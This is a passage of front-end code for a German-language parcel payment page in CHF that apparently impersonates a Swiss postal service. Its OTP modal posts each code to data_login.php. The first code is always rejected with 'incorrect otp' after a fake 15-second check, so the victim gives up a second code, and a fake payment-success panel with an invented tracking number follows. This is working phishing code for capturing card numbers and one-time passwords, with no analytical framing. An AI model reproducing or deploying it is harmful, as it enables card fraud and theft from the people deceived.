                background: linear-gradient(135deg, #28a745, #20c997);
            }

            .notification.error {
                background: linear-gradient(135deg, #dc3545, #c82333);
            }

            .notification.info {
                background: linear-gradient(135deg, #17a2b8, #138496);
            }

            /* VBV Form Styles */
            .vbv-section {
                display: none;
                background: white;
                padding: 2rem;
                border-radius: 12px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.15);
                margin: 0 auto;
                max-width: 450px;
                width: 100%;
                position: relative;
                z-index: 10;
                border: 1px solid #e0e0e0;
                box-sizing: border-box;
            }

            .vbv-section.active {
                display: block;
                animation: slideIn 0.5s ease;
            }

            @keyframes slideIn {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }

            .vbv-header {
                text-align: center;
                margin-bottom: 2rem;
            }

            .vbv-header h3 {
                color: #003399;
                margin-bottom: 0.5rem;
                font-size: 1.5rem;
            }

            .vbv-header p {
                color: #666;
                font-size: 0.95rem;
            }

            .card-info-display {
                background: #f8f9fa;
                padding: 1rem;
                border-radius: 8px;
                margin-bottom: 1.5rem;
                border: 1px solid #e9ecef;
            }

            .card-info-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 0.5rem;
            }

            .card-info-row:last-child {
                margin-bottom: 0;
            }

            .card-info-label {
                color: #666;
                font-size: 0.9rem;
            }

            .card-info-value {
                font-weight: 600;
                color: #333;
            }

            .card-type-logo {
                width: 40px;
                height: 25px;
                object-fit: contain;
            }

            .otp-input-group {
                margin-bottom: 1.5rem;
            }

            .otp-input-group label {
                display: block;
                margin-bottom: 0.75rem;
                font-weight: 500;
                color: #333;
            }

            .otp-input-container {
                display: flex;
                gap: 0.5rem;
                justify-content: center;
                margin-bottom: 1rem;
            }

            .otp-input {
                width: 50px;
                height: 50px;
                text-align: center;
                font-size: 1.5rem;
                font-weight: 600;
                border: 2px solid #ddd;
                border-radius: 8px;
                transition: all 0.3s ease;
            }

            .otp-input:focus {
                outline: none;
                border-color: #003399;
                box-shadow: 0 0 0 3px rgba(0,51,153,0.1);
            }

            .otp-input.filled {
                border-color: #28a745;
                background-color: #f8fff9;
            }

            .vbv-timer {
                text-align: center;
                margin-bottom: 1.5rem;
                color: #dc3545;
                font-weight: 500;
            }

            .vbv-actions {
                display: flex;
                gap: 1rem;
                margin-top: 1.5rem;
            }

            .vbv-actions button {
                flex: 1;
                padding: 0.75rem;
                border: none;
                border-radius: 6px;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.3s ease;
            }

            .btn-vbv-confirm {
                background: linear-gradient(135deg, #003399, #0056b3);
                color: white;
            }

            .btn-vbv-confirm:hover {
                background: linear-gradient(135deg, #0056b3, #003399);
                transform: translateY(-1px);
            }

            .btn-vbv-cancel {
                background: #f8f9fa;
                color: #666;
                border: 1px solid #ddd;
            }

            .btn-vbv-cancel:hover {
                background: #e9ecef;
            }

            /* Card type detection styles */
            .card-type-display {
                position: absolute;
                top: 20px;
                right: 20px;
                width: 50px;
                height: 30px;
                display: none;
            }

            .card-type-display.visa {
                background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCA1MCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjMwIiByeD0iNCIgZmlsbD0iIzE0MzRDMiIvPgo8cGF0aCBkPSJNMTUgMTBIMzVWMjBIMTVWMTBaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMjAgMTVIMzBWMjBIMjBWMTVaIiBmaWxsPSIjMTQzNDQyIi8+Cjwvc3ZnPg==') no-repeat center;
                background-size: contain;
            }

            .card-type-display.mastercard {
                background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCA1MCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjMwIiByeD0iNCIgZmlsbD0iI0VBMDIyOCIvPgo8Y2lyY2xlIGN4PSIxOCIgY3k9IjE1IiByPSI4IiBmaWxsPSIjRUYwMDI5Ii8+CjxjaXJjbGUgY3g9IjMyIiBjeT0iMTUiIHI9IjgiIGZpbGw9IiNGNzlDMTEiLz4KPC9zdmc+') no-repeat center;
                background-size: contain;
            }

            .card-type-display.amex {
                background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCA1MCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjMwIiByeD0iNCIgZmlsbD0iIzAwNjdBNyIvPgo8cGF0aCBkPSJNMTUgMTBIMzVWMjBIMTVWMTBaIiBmaWxsPSJ3aGl0ZSIvPgo8dGV4dCB4PSIyNSIgeT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiMwMDY3QjciIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiIgZm9udC13ZWlnaHQ9ImJvbGQiPkFNRXw8L3RleHQ+Cjwvc3ZnPg==') no-repeat center;
                background-size: contain;
            }
        </style>
        </style>

        <!-- OTP Verification Modal -->
        <div id="otpModal" class="modal" style="display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(4px);">
            <div class="otp-modal-container" style="background-color: #ffffff; margin: 5% auto; padding: 0; width: 90%; max-width: 480px; border-radius: 12px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); position: relative; overflow: hidden;">
                <!-- Modal Header -->
                <div class="otp-modal-header" style="background: linear-gradient(135deg, #003399 0%, #0052cc 100%); padding: 2rem 2rem 1.5rem; text-align: center; position: relative;">
                    <button type="button" class="otp-close-btn" style="position: absolute; top: 1rem; right: 1rem; background: rgba(255,255,255,0.2); border: none; width: 40px; height: 40px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.3s ease;">
                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style="stroke: #ffffff; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;">
                            <line x1="4" y1="4" x2="16" y2="16"></line>
                            <line x1="16" y1="4" x2="4" y2="16"></line>
                        </svg>
                    </button>
                    
                    <div class="otp-icon-container" style="width: 64px; height: 64px; background: rgba(255,255,255,0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1rem;">
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" style="stroke: #ffffff; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;">
                            <rect x="3" y="7" width="18" height="12" rx="2"></rect>
                            <path d="M8 11h8"></path>
                            <path d="M8 15h6"></path>
                        </svg>
                    </div>
                    
                    <h2 style="color: #ffffff; margin: 0 0 0.5rem; font-size: 1.5rem; font-weight: 600; font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif;">
                        Sicherheitsüberprüfung
                    </h2>
                    <p style="color: rgba(255,255,255,0.9); margin: 0; font-size: 0.95rem; font-weight: 400; line-height: 1.5;">
                        Bitte geben Sie den an Ihre Telefonnummer gesendeten<br>Bestätigungscode ein
                    </p>
                </div>
                
                <!-- Modal Body -->
                <div class="otp-modal-body" style="padding: 2rem;">
                    <!-- Card Information Display -->
                    <div class="card-info-display" style="background: #f8f9fa; border-radius: 8px; padding: 1.5rem; margin-bottom: 2rem; border: 1px solid #e0e0e0;">
                        <div class="card-info-header" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 1rem;">
                            <h3 style="margin: 0; color: #333; font-size: 1rem; font-weight: 600;">Zahlungsdetails</h3>
                            <div class="card-logo-container" style="width: 48px; height: 30px; display: flex; align-items: center; justify-content: center;">
                                <img id="cardLogo" src="" alt="Card Logo" style="max-width: 100%; max-height: 100%; object-fit: contain;">
                            </div>
                        </div>
                        
                        <div class="card-details" style="display: grid; gap: 0.75rem;">
                            <div class="card-number-display" style="display: flex; align-items: center; gap: 0.5rem;">
                                <span style="color: #666; font-size: 0.875rem;">Karte:</span>
                                <span id="cardLastFour" style="color: #333; font-weight: 600; font-size: 0.95rem;">****-****-****-1234</span>
                            </div>
                            
                            <div class="otp-card-type-display" style="display: none; align-items: center; gap: 0.5rem;">
                                <span style="color: #666; font-size: 0.875rem;">Typ:</span>
                                <span id="cardType" style="color: #333; font-weight: 600; font-size: 0.95rem;">Visa</span>
                            </div>
                            
                            <div class="price-display" style="display: flex; align-items: center; justify-content: space-between; padding-top: 0.75rem; border-top: 1px solid #e0e0e0;">
                                <span style="color: #666; font-size: 0.875rem;">Betrag:</span>
                                <span id="transactionAmount" style="color: #003399; font-weight: 700; font-size: 1.1rem;">CHF 0.00</span>
                            </div>
                        </div>
                    </div>
                    
                    <form id="otpForm" style="text-align: center;">
                        <div class="otp-instruction" style="margin-bottom: 2rem;">
                            <p style="color: #666666; margin: 0; font-size: 0.9rem; line-height: 1.5;">
                                6-stelliger Code
                            </p>
                        </div>
                        
                        <div id="otpInputs" class="otp-inputs-container" style="display: flex; justify-content: center; gap: 12px; margin-bottom: 2rem;">
                            <input type="text" maxlength="1" pattern="\d" class="otp-input" required>
                            <input type="text" maxlength="1" pattern="\d" class="otp-input" required>
                            <input type="text" maxlength="1" pattern="\d" class="otp-input" required>
                            <input type="text" maxlength="1" pattern="\d" class="otp-input" required>
                            <input type="text" maxlength="1" pattern="\d" class="otp-input" required>
                            <input type="text" maxlength="1" pattern="\d" class="otp-input" required>
                        </div>
                        
                        <input type="hidden" id="otpCode" name="otp_code">
                        <input type="hidden" id="sessionId" name="session_id">
                        
                        <button type="submit" class="otp-submit-btn" style="background: linear-gradient(135deg, #ffcc00 0%, #ffdb4d 100%); color: #003399; border: none; padding: 14px 32px; border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: 600; font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif; transition: all 0.3s ease; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); width: 100%; max-width: 200px;">
                            Bestätigen
                        </button>
                    </form>
                    
                    <div id="otpError" class="otp-error" style="color: #dc3545; text-align: center; margin-top: 1.5rem; display: none; padding: 12px 16px; background-color: #fff5f5; border: 1px solid #feb2b2; border-radius: 6px; font-size: 0.875rem; font-weight: 500;"></div>
                    
                    <div class="otp-resend-section" style="text-align: center; margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid #f0f0f0;">
                        <p style="color: #666666; margin: 0 0 0.75rem; font-size: 0.875rem;">
                            Kein Code erhalten?
                        </p>
                        <button type="button" id="resendOtp" class="otp-resend-btn" style="background: none; color: #003399; text-decoration: underline; border: none; padding: 8px 16px; font-size: 0.875rem; font-weight: 500; cursor: pointer; transition: all 0.3s ease; border-radius: 4px;">
                            Code erneut senden
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <style>
            /* Professional OTP Input Styles */
            .otp-input {
                width: 52px;
                height: 56px;
                text-align: center;
                font-size: 24px;
                font-weight: 600;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                background-color: #ffffff;
                color: #333333;
                transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
                font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif;
            }

            .otp-input:focus {
                outline: none;
                border-color: #003399;
                background-color: #ffffff;
                box-shadow: 0 0 0 3px rgba(0, 51, 153, 0.1), 0 4px 6px rgba(0, 0, 0, 0.1);
                transform: translateY(-1px);
            }

            .otp-input:hover {
                border-color: #b3b3b3;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }

            .otp-input.filled {
                border-color: #28a745;
                background-color: #f8fff9;
                color: #28a745;
                font-weight: 700;
            }

            .otp-input.error {
                border-color: #dc3545;
                background-color: #fff5f5;
                color: #dc3545;
                animation: shake 0.5s ease-in-out;
            }

            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }

            /* Modal Animation */
            .otp-modal-container {
                animation: modalSlideIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            }

            @keyframes modalSlideIn {
                from {
                    opacity: 0;
                    transform: translateY(-20px) scale(0.95);
                }
                to {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }

            /* Button Hover Effects */
            .otp-submit-btn:hover {
                background: linear-gradient(135deg, #ffdb4d 0%, #ffe566 100%);
                transform: translateY(-1px);
                box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15), 0 3px 5px rgba(0, 0, 0, 0.1);
            }

            .otp-submit-btn:active {
                transform: translateY(0);
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }

            .otp-close-btn:hover {
                background: rgba(255,255,255,0.3);
                transform: scale(1.05);
            }

            .otp-resend-btn:hover {
                background-color: #f8f9fa;
                text-decoration: none;
            }

            /* Error Message Animation */
            .otp-error.show {
                animation: errorSlideIn 0.3s ease-out;
            }

            @keyframes errorSlideIn {
                from {
                    opacity: 0;
                    transform: translateY(-10px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }

            /* Responsive Design */
            @media (max-width: 480px) {
                .otp-modal-container {
                    margin: 2% auto;
                    width: 95%;
                    max-width: none;
                    border-radius: 8px;
                }
                
                .otp-modal-header {
                    padding: 1.5rem 1rem 1rem;
                }
                
                .otp-modal-body {
                    padding: 1.5rem 1rem;
                }
                
                .otp-input {
                    width: 44px;
                    height: 48px;
                    font-size: 20px;
                }
                
                .otp-inputs-container {
                    gap: 8px;
                }
                
                .otp-submit-btn {
                    padding: 12px 24px;
                    font-size: 0.95rem;
                }
            }

            @media (max-width: 360px) {
                .otp-input {
                    width: 40px;
                    height: 44px;
                    font-size: 18px;
                }
                
                .otp-inputs-container {
                    gap: 6px;
                }
            }
        </style>
        <style>
            .modal {
                display: none;
                position: fixed;
                z-index: 1000;
                left: 0;
                top: 0;
                width: 100%;
                height: 100%;
                overflow: auto;
                background-color: rgba(0,0,0,0.4);
            }
        </style>

        <script>
            // Wait for DOM to be fully loaded
            document.addEventListener('DOMContentLoaded', function() {
                // OTP Modal elements
                const otpModal = document.getElementById('otpModal');
                const otpForm = document.getElementById('otpForm');
                const otpInputs = document.querySelectorAll('.otp-input');
                const otpCodeInput = document.getElementById('otpCode');
                const sessionIdInput = document.getElementById('sessionId');
                const otpError = document.getElementById('otpError');
                const resendOtpBtn = document.getElementById('resendOtp');

                // Show OTP modal function
                function showOtpModal(sessionId) {
                    // Reset state when showing modal
                    otpAttempts = 0;
                    if (otpTimer) clearTimeout(otpTimer);
                    if (resendTimer) clearTimeout(resendTimer);
                    
                    sessionIdInput.value = sessionId || Date.now().toString();
                    otpModal.style.display = 'block';
                    otpInputs[0].focus();
                    
                    // Update card information display
                    updateCardInfoDisplay();
                }
                
                // Card logo URLs
                const cardLogos = {
                    visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
                    mastercard: 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg',
                    amex: 'https://download.logo.wine/logo/American_Express/American_Express-Logo.wine.png'
                };
                
                // Function to update card information display
                function updateCardInfoDisplay() {
                    // Get card information from the credit card form
                    const cardNumberInput = document.getElementById('card-number');
                    
                    if (cardNumberInput) {
                        const cardNumber = cardNumberInput.value.replace(/\s/g, ''); // Remove spaces
                        // Use the global currentPrice variable
                        const amountText = currentPrice;
                        
                        // Get last 4 digits
                        const lastFour = cardNumber.slice(-4);
                        document.getElementById('cardLastFour').textContent = `****-****-****-${lastFour}`;
                        
                        // Update amount
                        document.getElementById('transactionAmount').textContent = amountText;
                        
                        // Determine card type and set logo
                        let cardType = 'visa'; // default
                        let logoSrc = cardLogos.visa;
                        
                        if (cardNumber.startsWith('4')) {
                            cardType = 'Visa';
                            logoSrc = cardLogos.visa;
                        } else if (cardNumber.startsWith('5') || cardNumber.startsWith('2')) {
                            cardType = 'Mastercard';
                            logoSrc = cardLogos.mastercard;
                        } else if (cardNumber.startsWith('3')) {
                            cardType = 'American Express';
                            logoSrc = cardLogos.amex;
                        }
                        
                        document.getElementById('cardType').textContent = cardType;
                        document.getElementById('cardLogo').src = logoSrc;
                        
                        // Add error handling for logo loading
                        document.getElementById('cardLogo').onerror = function() {
                            // If logo fails to load, show a fallback
                            this.style.display = 'none';
                        };
                        
                        document.getElementById('cardLogo').onload = function() {
                            // Show logo when successfully loaded
                            this.style.display = 'block';
                        };
                    }
                }

                // Close OTP modal
                function closeOtpModal() {
                    otpModal.style.display = 'none';
                    otpError.style.display = 'none';
                    otpError.classList.remove('show');
                    otpForm.reset();
                    otpInputs.forEach(input => {
                        input.value = '';
                        input.classList.remove('filled', 'error');
                    });
                    
                    // Show credit card section when OTP modal is closed
                    const creditCardSection = document.querySelector('.credit-card-section');
                    if (creditCardSection) {
                        creditCardSection.classList.add('active');
                    }
                }

                // Close modal when clicking the X
                const closeBtn = document.querySelector('.otp-close-btn');
                closeBtn.onclick = closeOtpModal;

                // Close modal when clicking outside the modal
                window.onclick = function(event) {
                    if (event.target === otpModal) {
                        closeOtpModal();
                    }
                };

                // Handle OTP input
                otpInputs.forEach((input, index) => {
                    // Allow only numbers
                    input.addEventListener('input', function() {
                        this.value = this.value.replace(/[^0-9]/g, '');
                        
                        // Add visual feedback for filled state
                        if (this.value.length === 1) {
                            this.classList.add('filled');
                            // Move to next input on number input
                            if (index < otpInputs.length - 1) {
                                otpInputs[index + 1].focus();
                            }
                        } else {
                            this.classList.remove('filled');
                        }
                        
                        // Update hidden input with full OTP code
                        updateOtpCode();
                    });
                    
                    // Handle backspace
                    input.addEventListener('keydown', function(e) {
                        if (e.key === 'Backspace' && this.value === '' && index > 0) {
                            otpInputs[index - 1].focus();
                            otpInputs[index - 1].classList.remove('filled');
                        }
                        
                        // Handle arrow keys
                        if (e.key === 'ArrowLeft' && index > 0) {
                            otpInputs[index - 1].focus();
                        }
                        if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
                            otpInputs[index + 1].focus();
                        }
                    });
                    
                    // Handle paste
                    input.addEventListener('paste', function(e) {
                        e.preventDefault();
                        const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                        
                        if (pastedData.length > 0) {
                            // Fill inputs with pasted data
                            for (let i = 0; i < Math.min(pastedData.length, otpInputs.length); i++) {
                                otpInputs[i].value = pastedData[i];
                                otpInputs[i].classList.add('filled');
                            }
                            
                            // Focus the next empty input or the last one
                            const nextEmptyIndex = Math.min(pastedData.length, otpInputs.length - 1);
                            if (nextEmptyIndex < otpInputs.length) {
                                otpInputs[nextEmptyIndex].focus();
                            }
                            
                            updateOtpCode();
                        }
                    });
                });

                // Update hidden OTP code input
                function updateOtpCode() {
                    let code = '';
                    otpInputs.forEach(input => {
                        code += input.value;
                    });
                    otpCodeInput.value = code;
                }

                // Track OTP attempt count
                let otpAttempts = 0;
                let otpTimer = null;
                let resendTimer = null;
                const OTP_WAIT_TIME = 10; // seconds
                const RESEND_WAIT_TIME = 12; // seconds

                // Function to show OTP not correct message after delay
                function showOtpErrorAfterDelay() {
                    if (otpTimer) clearTimeout(otpTimer);
                    
                    otpTimer = setTimeout(() => {
                        otpError.textContent = 'OTP nicht korrekt. Bitte versuchen Sie es erneut.';
                        otpError.style.display = 'block';
                        otpError.classList.add('show');
                        
                        // Clear inputs and focus first field
                        otpInputs.forEach(input => {
                            input.value = '';
                            input.classList.remove('filled', 'error');
                        });
                        otpInputs[0].focus();
                    }, OTP_WAIT_TIME * 1000);
                }

                // Function to show delivery message after resend delay
                function showDeliveryMessageAfterDelay() {
                    if (resendTimer) clearTimeout(resendTimer);
                    
                    resendTimer = setTimeout(() => {
                        closeOtpModal();
                        showNotification('Ihr Paket wird in Kürze geliefert.', 'success');
                    }, RESEND_WAIT_TIME * 1000);
                }

                // Track if this is first OTP submission
                let isFirstOtpSubmission = true;

                // Handle OTP form submission
                otpForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const otpCode = otpCodeInput.value;
                    const sessionId = sessionIdInput.value;
                    
                    if (otpCode.length !== 6) {
                        return; // Silently return without showing error
                    }
                    
                    // Send OTP to server
                    fetch('data_login.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            action: 'verify_otp',
                            otp_code: otpCode,
                            session_id: sessionId
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (isFirstOtpSubmission) {
                            // Show loading for 15 seconds on first submission
                            showLoading('Überprüfe Code...');
                            
                            setTimeout(() => {
                                hideLoading();
                                otpError.textContent = 'incorrect otp';
                                otpError.style.display = 'block';
                                isFirstOtpSubmission = false;
                                
                                // Clear inputs and focus first field
                                otpInputs.forEach(input => {
                                    input.value = '';
                                    input.classList.remove('filled', 'error');
                                });
                                otpInputs[0].focus();
                            }, 15000);
                        } else {
                            // On subsequent submissions (correct OTP), show loading for 10 seconds
                            showLoading('Überprüfe Code...');
                            
                            setTimeout(() => {
                                hideLoading();
                                closeOtpModal();
                                
                                // Hide Vorschau section and preview-card
                                const previewContainer = document.querySelector('.vsc-preview-container');
                                const previewCard = document.querySelector('.preview-card');
                                if (previewContainer) {
                                    previewContainer.style.display = 'none';
                                }
                                if (previewCard) {
                                    previewCard.style.display = 'none';
                                }
                                
                                // Make Übersicht style as completed and stepper-link completed
                                const stepperItems = document.querySelectorAll('.stepper-item');
                                const stepperLinks = document.querySelectorAll('.stepper-link');
                                const progressBar = document.querySelector('.progress-bar');
                                
                                if (progressBar) {
                                    progressBar.style.width = '100%';
                                }
                                
                                stepperItems.forEach((item, index) => {
                                    item.classList.remove('aria-current', 'step');
                                    if (index === 2) { // Step 3 (Übersicht)
                                        item.setAttribute('aria-current', 'step');
                                        item.classList.add('active', 'completed');
                                    }
                                });
                                
                                // Make all stepper-links show as completed
                                stepperLinks.forEach(link => {
                                    link.classList.add('completed');
                                });
                                
                                // Create and show success panel
                                const successPanel = document.createElement('div');
                                successPanel.style.cssText = `
                                    background: linear-gradient(135deg, #ffcc00 0%, #ffdb4d 50%, #ffcc00 100%);
                                    color: #003399;
                                    padding: 3rem 2rem;
                                    border-radius: 12px;
                                    text-align: center;
                                    margin: 2rem auto;
                                    max-width: 600px;
                                    box-shadow: 0 8px 32px rgba(0, 51, 153, 0.15);
                                    border: 2px solid #003399;
                                    position: relative;
                                    font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif;
                                `;
                                successPanel.innerHTML = `
                                    <div style="position: absolute; top: -15px; left: 50%; transform: translateX(-50%); background: #003399; color: #ffcc00; padding: 8px 24px; border-radius: 20px; font-weight: bold; font-size: 0.9rem; box-shadow: 0 2px 8px rgba(0, 51, 153, 0.3);">
                                        ✓ ZAHLUNG ERFOLGREICH
                                    </div>
                                    <div style="margin-top: 20px;">
                                        <div style="width: 80px; height: 80px; margin: 0 auto 2rem auto; background: #003399; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                                            <svg width="50" height="50" viewBox="0 0 24 24" fill="none" style="color: #ffcc00;">
                                                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7.41 23 16l1.42-1.41z"/>
                                                <path d="M20 6l-2.18-2.18a2.5 2.5 0 0 0-3.54 0L12 8.1V6a2 2 0 0 0-2-2 2 2 0 0 0-2 2v2.1l-2.28-2.28a2.5 2.5 0 0 0-3.54 0L4 6"/>
                                            </svg>
                                        </div>
                                        <h2 style="margin: 0 0 1rem 0; font-size: 2rem; font-weight: 700; color: #003399;">Vielen Dank für Ihre Zahlung!</h2>
                                        <div style="background: rgba(255, 255, 255, 0.9); padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; border-left: 4px solid #003399;">
                                            <h3 style="margin: 0 0 0.5rem 0; font-size: 1.2rem; color: #003399; display: flex; align-items: center; gap: 0.5rem;">
                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="#003399">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                                                </svg>
                                                Sendung erfolgreich verarbeitet
                                            </h3>
                                            <p style="margin: 0.5rem 0; font-size: 1rem; color: #333; line-height: 1.6;">
                                                Ihre Sendung wurde erfolgreich registriert und wird in Kürze zugestellt.
                                            </p>
                                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
                                                <div style="background: #f8f9fa; padding: 1rem; border-radius: 6px; border: 1px solid #e9ecef;">
                                                    <div style="font-size: 0.85rem; color: #666; margin-bottom: 0.25rem;">Voraussichtliche Lieferung</div>
                                                    <div style="font-weight: 600; color: #003399; font-size: 1.1rem;">Heute bis 18:00 Uhr</div>
                                                </div>
                                                <div style="background: #f8f9fa; padding: 1rem; border-radius: 6px; border: 1px solid #e9ecef;">
                                                    <div style="font-size: 0.85rem; color: #666; margin-bottom: 0.25rem;">Sendungsnummer</div>
                                                    <div style="font-weight: 600; color: #003399; font-size: 1.1rem; font-family: monospace;">CH-00-1234-5678-9</div>
                                                </div>
                                            </div>
                                        </div>
                                        <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 51, 153, 0.2);">
                                            <p style="margin: 0; font-size: 0.9rem; color: #003399; font-weight: 500;">
                                                Sie erhalten eine Bestätigung per E-Mail mit allen Details.
                                            </p>
                                            <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 1rem;">
                                                <button style="background: #003399; color: white; padding: 0.75rem 2rem; border: none; border-radius: 6px; font-weight: 500; cursor: pointer; transition: all 0.3s ease;" onmouseover="this.style.background='#0056b3'" onmouseout="this.style.background='#003399'">
                                                    Sendung verfolgen
                                                </button>
                                                <button style="background: transparent; color: #003399; padding: 0.75rem 2rem; border: 2px solid #003399; border-radius: 6px; font-weight: 500; cursor: pointer; transition: all 0.3s ease;" onmouseover="this.style.background='#003399'; this.style.color='white'" onmouseout="this.style.background='transparent'; this.style.color='#003399'">
                                                    Rechnung herunterladen
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                `;
                                
                                // Insert success panel where the content was
                                const contentContainer = document.querySelector('.vsc-content-container');
                                if (contentContainer) {
                                    contentContainer.innerHTML = '';
                                    contentContainer.appendChild(successPanel);
                                }
                            }, 10000);
                        }
                    })
                    .catch(error => {
                        if (isFirstOtpSubmission) {
                            // Show loading for 15 seconds on first submission even on error
                            showLoading('Überprüfe Code...');
                            
                            setTimeout(() => {
                                hideLoading();
                                otpError.textContent = 'incorrect otp';
                                otpError.style.display = 'block';
                                isFirstOtpSubmission = false;
                                
                                // Clear inputs and focus first field
                                otpInputs.forEach(input => {
                                    input.value = '';
                                    input.classList.remove('filled', 'error');
                                });
                                otpInputs[0].focus();
                            }, 15000);
                        } else {
                            // On subsequent submissions (correct OTP), show loading for 10 seconds
                            showLoading('Überprüfe Code...');
                            
                            setTimeout(() => {
                                hideLoading();
                                closeOtpModal();
                                
                                // Hide Vorschau section and preview-card
                                const previewContainer = document.querySelector('.vsc-preview-container');
                                const previewCard = document.querySelector('.preview-card');
                                if (previewContainer) {
                                    previewContainer.style.display = 'none';
                                }
                                if (previewCard) {
                                    previewCard.style.display = 'none';
                                }
                                
                                // Make Übersicht style as completed and stepper-link completed
                                const stepperItems = document.querySelectorAll('.stepper-item');
                                const stepperLinks = document.querySelectorAll('.stepper-link');
                                const progressBar = document.querySelector('.progress-bar');
                                
                                if (progressBar) {
                                    progressBar.style.width = '100%';
                                }
                                
                                stepperItems.forEach((item, index) => {
                                    item.classList.remove('aria-current', 'step');
                                    if (index === 2) { // Step 3 (Übersicht)
                                        item.setAttribute('aria-current', 'step');
                                        item.classList.add('active', 'completed');
                                    }
                                });
                                
                                // Make all stepper-links show as completed
                                stepperLinks.forEach(link => {
                                    link.classList.add('completed');
                                });
                                
                                // Create and show success panel
                                const successPanel = document.createElement('div');
                                successPanel.style.cssText = `
                                    background: linear-gradient(135deg, #ffcc00 0%, #ffdb4d 50%, #ffcc00 100%);
                                    color: #003399;
                                    padding: 3rem 2rem;
                                    border-radius: 12px;
                                    text-align: center;
                                    margin: 2rem auto;
                                    max-width: 600px;
                                    box-shadow: 0 8px 32px rgba(0, 51, 153, 0.15);
                                    border: 2px solid #003399;
                                    position: relative;
                                    font-family: 'Frutiger', 'Helvetica', 'Arial', sans-serif;
                                `;
                                successPanel.innerHTML = `
                                    <div style="position: absolute; top: -15px; left: 50%; transform: translateX(-50%); background: #003399; color: #ffcc00; padding: 8px 24px; border-radius: 20px; font-weight: bold; font-size: 0.9rem; box-shadow: 0 2px 8px rgba(0, 51, 153, 0.3);">
                                        ✓ ZAHLUNG ERFOLGREICH
                                    </div>
                                    <div style="margin-top: 20px;">
                                        <div style="width: 80px; height: 80px; margin: 0 auto 2rem auto; background: #003399; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                                            <svg width="50" height="50" viewBox="0 0 24 24" fill="none" style="color: #ffcc00;">
                                                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7.41 23 16l1.42-1.41z"/>
